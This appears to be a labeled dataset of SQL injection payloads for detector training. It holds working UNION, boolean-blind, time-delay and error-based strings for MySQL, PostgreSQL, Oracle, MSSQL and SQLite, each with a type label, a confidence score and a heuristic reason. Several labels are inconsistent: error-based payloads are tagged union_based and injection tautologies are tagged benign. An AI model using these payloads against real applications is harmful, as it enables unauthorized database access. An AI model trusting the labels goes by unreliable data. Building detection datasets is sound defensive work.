id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
23965,"1'|| ( select 'lzvb' where 1637 = 1637 union all select null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 96 chars.,2
23966,"-8308"" ) union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",union_based,generic,0.7,UNION-based payload detected. Payload length: 71 chars.,2
23969,"1' ) where 2284 = 2284 and make_set ( 8403 = 8403,8899 ) --",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 59 chars.,2
23973,"1"" ) and 3732 = 3850 and ( ""edjv"" = ""edjv",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 41 chars.,2
23974,1' ) ) union all select null#,union_based,generic,0.7,UNION-based payload detected. Payload length: 29 chars.,2
23975,"1"" ) ) and 7656 = 5604 and ( ( ""zuhv"" = ""zuhv",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 45 chars.,2
23977,"1"" ) union all select null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 63 chars.,2
23983,"-6639' ) as trll where 6271 = 6271 union all select 6271,6271,6271#",union_based,generic,0.7,UNION-based payload detected. Payload length: 67 chars.,2
23994,"1"" ) ) as bovm where 5560 = 5560 union all select null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 85 chars.,2
23999,"-6599"" ) ) union all select 2870,2870,2870,2870,2870,2870,2870,2870,2870,2870--",union_based,generic,0.7,UNION-based payload detected. Payload length: 79 chars.,2
24001,"-4025"" or 3038 = 3038",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 21 chars.,2
24013,"-1451%' ) union all select 7666,7666,7666#",union_based,generic,0.7,UNION-based payload detected. Payload length: 42 chars.,2
24014,"-6126 union all select 8486,8486,8486,8486,8486,8486,8486,8486,8486--",union_based,generic,0.7,UNION-based payload detected. Payload length: 69 chars.,2
24017,"-2007' where 9157 = 9157 union all select 9157,9157,9157,9157,9157,9157,9157,9157,9157#",union_based,generic,0.7,UNION-based payload detected. Payload length: 87 chars.,2
24020,-2817 ) where 1212 = 1212 or 3266 = 1102,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 40 chars.,2
24027,"1"" ) ) union all select null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 59 chars.,2
24030,1' and 6621 = 4681--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 20 chars.,2
24038,"-1269"" union all select 8412,8412,8412,8412,8412,8412,8412,8412--",union_based,generic,0.7,UNION-based payload detected. Payload length: 65 chars.,2
24041,"-9891"" union all select 7489#",union_based,generic,0.7,UNION-based payload detected. Payload length: 29 chars.,2
24042,1%' union all select null#,union_based,generic,0.7,UNION-based payload detected. Payload length: 26 chars.,2
24044,"-8981%"" ) ) ) union all select 4538,4538,4538,4538,4538,4538,4538#",union_based,generic,0.7,UNION-based payload detected. Payload length: 66 chars.,2
24045,"-3913"" where 6085 = 6085 union all select 6085,6085,6085,6085,6085,6085,6085#",union_based,generic,0.7,UNION-based payload detected. Payload length: 77 chars.,2
24051,"1"" ) ) union all select null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 39 chars.,2
24058,"1%"" ) ) ) and 4595 = 4595#",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 26 chars.,2
24060,-7903 where 6699 = 6699 or 8571 = 8571--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 40 chars.,2
24062,"-5066' ) ) union all select 9689,9689,9689,9689#",union_based,generic,0.7,UNION-based payload detected. Payload length: 48 chars.,2
24066,"1%"" ) ) ) union all select null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 33 chars.,2
24067,"1%' ) ) ) union all select null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 52 chars.,2
24068,"-4692%"" ) ) union all select 1781,1781#",union_based,generic,0.7,UNION-based payload detected. Payload length: 39 chars.,2
24081,"1' ) ) as uncy where 8009 = 8009 union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 95 chars.,2
24087,1' and 2908 = 8067--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 20 chars.,2
24091,"1%' ) ) union all select null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 46 chars.,2
24092,1' in boolean mode ) and 4457 = 3885#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 37 chars.,2
24096,"1%"" ) ) union all select null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 36 chars.,2
24101,"1"" ) ) union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 74 chars.,2
24115,"-1985%' ) ) ) union all select 3051,3051,3051--",union_based,generic,0.7,UNION-based payload detected. Payload length: 47 chars.,2
24116,"-7661"" union all select 9551,9551,9551#",union_based,generic,0.7,UNION-based payload detected. Payload length: 39 chars.,2
24122,"-1031%"" union all select 6832,6832,6832,6832#",union_based,generic,0.7,UNION-based payload detected. Payload length: 45 chars.,2
24126,"-1084' ) union all select 2634,2634,2634,2634,2634,2634,2634,2634#",union_based,generic,0.7,UNION-based payload detected. Payload length: 66 chars.,2
24130,"-4452%"" union all select 7141,7141,7141,7141,7141,7141,7141,7141--",union_based,generic,0.7,UNION-based payload detected. Payload length: 66 chars.,2
23951,"1%"" ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ""%"" = """,boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
23953,"1%' ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
23976,"1 ) ) as llnm where 6510 = 6510 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
24000,"1%' ) ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( '%' = '",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
24010,"1 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
24018,"1 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
24033,"1 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) )",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
24046,"1"" ) where 3958 = 3958 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
24064,"1"" ) ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( ""vfoh"" = ""vfoh",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
24070,"1%"" ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ""%"" = """,time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
24071,"1' ) as myxr where 6299 = 6299 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
24072,"1' ) as yhgk where 9246 = 9246 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
24077,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( '%' = '",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
24088,"1%' ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( '%' = '",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
24105,"1%"" ) ) ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
24114,"1' in boolean mode ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
24120,"1 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
24131,"1"" ) ) rlike sleep ( 5 ) #",time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1
24133,"1"" ) as hfgk where 1100 = 1100 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
23952,"1"" ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
24073,"1"" where 7279 = 7279 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
24074,"1%"" and elt ( 5345 = 8751,8751 ) and ""%"" = """,boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,1
23947,end and ( 'uxzv' = 'uxzv,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 24 chars.,1
23959,1' in boolean mode ) and ( 3020 = 3020 ) *6703#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 47 chars.,1
23960,"1 ) ) and make_set ( 8403 = 8403,8899 ) and ( ( 4686 = 4686",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 59 chars.,1
23970,-6014' ) ) or ( 9860 = 4848 ) *4848 and ( ( 'qtge' = 'qtge,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 58 chars.,1
23986,end and ( ( ( 'gqhc' = 'gqhc,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 28 chars.,1
23997,"1' in boolean mode ) and make_set ( 8403 = 8403,8899 ) #",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 56 chars.,1
24047,"-4381 or make_set ( 6118 = 3095,3095 ) # lkcr",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 45 chars.,1
24056,1' ) ) and ( 5091 = 8681 ) *8681 and ( ( 'xevm' = 'xevm,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 55 chars.,1
24108,"-7923"" ) ) or make_set ( 9354 = 9354,7185 ) and ( ( ""szct"" = ""szct",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 66 chars.,1
24138,"1"" ) ) ) and ( 7396 = 6351 ) *6351 and ( ( ( ""xerw"" like ""xerw",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 62 chars.,1
23972,"1"" where 8571 = 8571",benign,generic,0.5,. Payload length: 20 chars.,1
23987,1' ) ) as wqhm where 9871 = 9871,benign,generic,0.5,. Payload length: 32 chars.,1
24004,1' ) where 2227 = 2227,benign,generic,0.5,. Payload length: 22 chars.,1
24069,"1"" ) as xrsi where 9498 = 9498",benign,generic,0.5,. Payload length: 30 chars.,1
24075,1 ) ) as xcsm where 9231 = 9231,benign,generic,0.5,. Payload length: 31 chars.,1
24076,"1"" ) as vdim where 1296 = 1296",benign,generic,0.5,. Payload length: 30 chars.,1
24086,1' ) as sjij where 8659 = 8659,benign,generic,0.5,. Payload length: 30 chars.,1
24094,"1"" where 7879 = 7879",benign,generic,0.5,. Payload length: 20 chars.,1
24104,1 ) as xtgr where 1545 = 1545,benign,generic,0.5,. Payload length: 29 chars.,1
24106,"1"" ) ) as ikuz where 7385 = 7385",benign,generic,0.5,. Payload length: 32 chars.,1
24137,1 ) as nioj where 9703 = 9703,benign,generic,0.5,. Payload length: 29 chars.,1
23944,1' ) as syer where 3141 = 3141 rlike ( select ( case when ( 6233 = 7567 ) then 1 else 0x28 end ) ) --,union_based,mysql,1.0,"Signals: 'rlike', 'case'; UNION-based payload detected; DB: mysql",0
23950,"1 ) as nfgb where 2503 = 2503 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",union_based,mysql,1.0,"Signals: 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
23956,"1' ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( 'adnz' = 'adnz",union_based,mysql,1.0,"Signals: 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
23962,select ( case when ( 9490 = 6134 ) then 9490 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,union_based,generic,1.0,"Signals: 'cast', 'case', 'dual'; UNION-based payload detected",0
23967,select ( case when ( 6047 = 8897 ) then 6047 else 6047* ( select 6047 from information_schema.character_sets ) end ) #,union_based,mssql,1.0,"Signals: 'char', 'case', 'information_schema'; UNION-based payload detected; DB: mssql",0
23968,"1, ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 9693 = 9693,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) )",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'if'; UNION-based payload detected; DB: mysql",0
23978,"1' ) ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ( 'rnyb' = 'rnyb",union_based,generic,1.0,"Signals: 'substring', 'substr', 'char'; UNION-based payload detected",0
23981,1' ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( 'dtzt' like 'dtzt,union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; UNION-based payload detected; DB: postgresql",0
23988,"1"" ) ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ""rvuz"" like ""rvuz",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'exp'; UNION-based payload detected; DB: mysql",0
23989,-3458' ) where 2053 = 2053 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --,union_based,oracle,1.0,"Signals: 'chr', 'case', 'dual'; UNION-based payload detected; DB: oracle",0
23998,1' in boolean mode ) rlike ( select ( case when ( 1343 = 1595 ) then 1 else 0x28 end ) ) #,union_based,mysql,1.0,"Signals: 'rlike', 'case'; UNION-based payload detected; DB: mysql",0
24002,"1"" or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) )",union_based,mysql,1.0,"Signals: 'extractvalue', 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
24003,"1' ) ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( 'jwbt' = 'jwbt",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'exp'; UNION-based payload detected; DB: mysql",0
24008,"1"" ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( ""utlk"" like ""utlk",time_blind,mysql,1.0,"Signals: 'elt', 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql",0
24012,1' ) ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; UNION-based payload detected; DB: postgresql",0
24016,"1"" ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ""rkry"" like ""rkry",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'if'; UNION-based payload detected; DB: mysql",0
24019,"1%"" ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #",union_based,mysql,1.0,"Signals: 'sleep', 'rlike'; UNION-based payload detected; DB: mysql",0
24022,"1, ( select ( case when ( 9443 = 9443 ) then sleep ( 5 ) else 9443* ( select 9443 from information_schema.character_sets ) end ) )",union_based,mysql,1.0,"Signals: 'sleep', 'char', 'case'; UNION-based payload detected; DB: mysql",0
24025,-5803 ) where 8651 = 8651 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --,union_based,oracle,1.0,"Signals: 'chr', 'case', 'utl_inaddr'; UNION-based payload detected; DB: oracle",0
24026,"1 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) # mpyu",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'exp'; UNION-based payload detected; DB: mysql",0
24028,select ( case when ( 2352 = 8672 ) then 2352 else 2352* ( select 2352 from information_schema.character_sets ) end ) #,union_based,mssql,1.0,"Signals: 'char', 'case', 'information_schema'; UNION-based payload detected; DB: mssql",0
24029,"1' ) ) ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ( ( 'ichh' like 'ichh",union_based,generic,1.0,"Signals: 'extractvalue', 'concat', 'case'; UNION-based payload detected",0
24031,1' and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and 'oofd' = 'oofd,union_based,oracle,1.0,"Signals: 'chr', 'case', 'dual'; UNION-based payload detected; DB: oracle",0
24034,"1' ) as uvxl where 6211 = 6211 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) --",union_based,generic,1.0,"Signals: 'extractvalue', 'concat', 'case'; UNION-based payload detected",0
24035,"1' in boolean mode ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) #",union_based,mysql,1.0,"Signals: 'updatexml', 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
24036,-3582 ) where 5873 = 5873 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --,union_based,oracle,1.0,"Signals: 'chr', 'case', 'dual'; UNION-based payload detected; DB: oracle",0
24037,"1' ) as fyuh where 7608 = 7608 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",union_based,mssql,1.0,"Signals: 'convert', 'char', 'case'; UNION-based payload detected; DB: mssql",0
24039,"1' or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 )",union_based,mysql,1.0,"Signals: 'updatexml', 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
24040,-4758%' ) ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( '%' = ',union_based,generic,1.0,"Signals: 'case', 'rdb'; UNION-based payload detected",0
24043,"-1707 ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( 7756 = 7756",union_based,mssql,1.0,"Signals: 'convert', 'char', 'case'; UNION-based payload detected; DB: mssql",0
24048,1' rlike ( select ( case when ( 5567 = 5586 ) then 1 else 0x28 end ) ) and 'mmnb' = 'mmnb,union_based,mysql,1.0,"Signals: 'rlike', 'case'; UNION-based payload detected; DB: mysql",0
